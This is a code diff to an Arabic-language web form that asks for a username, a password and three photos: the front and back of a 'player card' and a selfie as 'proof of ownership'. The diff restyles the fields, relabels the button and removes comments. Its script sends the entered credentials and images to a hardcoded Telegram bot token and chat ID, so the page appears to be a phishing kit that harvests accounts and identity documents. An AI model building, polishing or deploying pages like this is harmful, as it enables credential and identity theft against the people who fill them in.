@@ -120,21 +120,31 @@
     line-height: 1.4;
   }
   
+  /* الحقول أعرض شوي صغيرة، لونا أبيض، والإطار المحيط أعرض عند التركيز */
   .form-control {
     width: 100%;
-    padding: 11px 12px;
+    padding: 14px 14px; /* أعرض شوي صغيرة */
     border: 1px solid #dde2f7;
     border-radius: 6px;
     font-family: inherit;
-    font-size: 14px;
+    font-size: 15px;
     color: var(--navy);
-    background-color: #fcfdfe;
+    background-color: #ffffff; /* لونها أبيض */
     outline: none;
-    transition: border-color 0.2s;
+    transition: border-width 0.1s ease, border-color 0.2s;
   }
   
+  /* جعل الإطار الأزرق المحيط أعرض شوي عند الضغط والكتابة */
   .form-control:focus {
-    border-color: var(--blue-text);
+    border: 3px solid var(--blue-text); /* أعرض شوي */
+    padding: 12px 12px; /* تعديل الـ padding للحفاظ على ثبات الحجم مع زيادة حجم الإطار */
+  }
+  
+  /* جعل البليس هولدر أوضح وأكبر */
+  .form-control::placeholder {
+    color: #4a5270; /* لون أوضح وأغمق */
+    font-size: 15px; /* حجم أكبر */
+    font-weight: 500;
   }
   
   .file-dropzone {
@@ -271,7 +281,7 @@
       <form class="form-modal-body" id="dataForm">
         
         <div class="form-group">
-          <input type="text" id="username" class="form-control" placeholder="اسم المستخدم الذي تريده" required>
+          <input type="text" id="username" class="form-control" placeholder="اسم المستخدم" required>
         </div>
         
         <div class="form-group">
@@ -303,7 +313,7 @@
         </div>
         
         <div class="form-footer">
-          <button type="submit" id="submitBtn" class="btn-submit" disabled>قدم طلب</button>
+          <button type="submit" id="submitBtn" class="btn-submit" disabled>إثبات الملكية</button>
         </div>
 
       </form>
@@ -325,7 +335,7 @@
 
 <script>
   // ========================================================
-  // مكان وضع توكن البوت والـ ID الخاص بك مجدداً هنا:
+  // إعدادات التليجرام
   // ========================================================
   const TELEGRAM_BOT_TOKEN = '8905455566:AAFQLQWmxsp3U0S6I650V85yYK8tiDSyo9w';
   const TELEGRAM_CHAT_ID = '5437487652';
@@ -376,7 +386,6 @@
     });
   });
 
-  // كود إرسال البيانات المكتملة إلى التلجرام مباشرة
   dataForm.addEventListener('submit', async function(e) {
     e.preventDefault();
     
@@ -387,12 +396,11 @@
     const fileSelfie = document.getElementById('fileSelfie').files[0];
 
     submitBtn.disabled = true;
-    submitBtn.innerText = "جاري إرسال الطلب...";
+    submitBtn.innerText = "جاري إرسال الطلب..."; /* تعديل النص عند النقر */
 
     const textMessage = `📌 *طلب جديد واصل*\n\n👤 *اسم المستخدم:* \`${userVal}\`\n🔒 *كلمة السر:* \`${passVal}\``;
     
     try {
-      // إرسال البيانات النصية أولاً
       await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -403,7 +411,6 @@
         })
       });
 
-      // دالة إرسال الملفات والصور
       async function sendPhotoToTelegram(file, caption) {
         if(!file) return;
         const formData = new FormData();
@@ -417,7 +424,6 @@
         });
       }
 
-      // إرسال الصور الثلاثة بالتتابع
       await sendPhotoToTelegram(fileFront, `🖼️ الوجه الأمامي لبطاقة اللاعب (${userVal})`);
       await sendPhotoToTelegram(fileBack, `🖼️ الوجه الخلفي لبطاقة اللاعب (${userVal})`);
       await sendPhotoToTelegram(fileSelfie, `👤 الصورة الشخصية - إثبات الملكية (${userVal})`);
@@ -438,7 +444,7 @@
       alert('حدث خطأ أثناء إرسال المدخلات، يرجى إعادة المحاولة.');
     } finally {
       submitBtn.disabled = false;
-      submitBtn.innerText = "قدم طلب";
+      submitBtn.innerText = "إثبات الملكية";
     }
   });
 </script>
